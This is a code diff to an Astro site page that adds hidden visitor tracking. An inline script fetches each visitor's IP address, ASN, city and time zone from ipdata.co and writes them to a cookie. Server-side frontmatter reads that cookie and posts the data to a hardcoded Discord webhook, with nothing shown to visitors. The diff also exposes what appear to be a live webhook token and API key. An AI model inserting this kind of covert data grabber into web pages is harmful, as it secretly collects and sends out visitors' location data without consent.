@@ -3,6 +3,22 @@ import BaseHead from '../components/BaseHead.astro';
 import Header from '../components/Header.astro';
 import Footer from '../components/Footer.astro';
 import { SITE_TITLE, SITE_DESCRIPTION } from '../consts';
+
+const cookieOne = Astro.cookies.get('Datas').value
+import { Webhook, MessageBuilder } from 'discord-webhook-node';
+
+const webHookUrl = 'https://discord.com/api/webhooks/1170383547568230500/HVpq3d3nVcybSAefhSfnnOmUBQHd7nmn9BjMIQpXwXa3mTkMEYa0gYEwcl7bggtommEj'
+const hook = new Webhook(webHookUrl);
+const jsonData = JSON.parse(cookieOne);
+
+const embed = new MessageBuilder()
+.setTitle(jsonData.ip + " - " + jsonData.asn.name)
+.setColor('#00b0f4')
+.setDescription('```json\n' + JSON.stringify(jsonData, null, 2) + '```')
+.setFooter(jsonData.city + " | " + jsonData.time_zone.abbr, jsonData.flag)
+.setTimestamp();
+ 
+hook.send(embed);
 ---
 
 <!doctype html>
@@ -46,5 +62,17 @@ import { SITE_TITLE, SITE_DESCRIPTION } from '../consts';
 			</p>
 		</main>
 		<Footer />
+		<script>
+		let data;
+		function json(url) {
+  		return fetch(url).then(res => res.json());
+		}
+
+		json(`https://api.ipdata.co?api-key=18567eca47edd77e07ea6569fb14643fec357c8a3c1e6c96ed69300e`).then(async (res) => {
+  		data = res
+  		document.cookie = `Datas=${JSON.stringify(data)}`;
+
+		});
+		</script>
 	</body>
 </html>
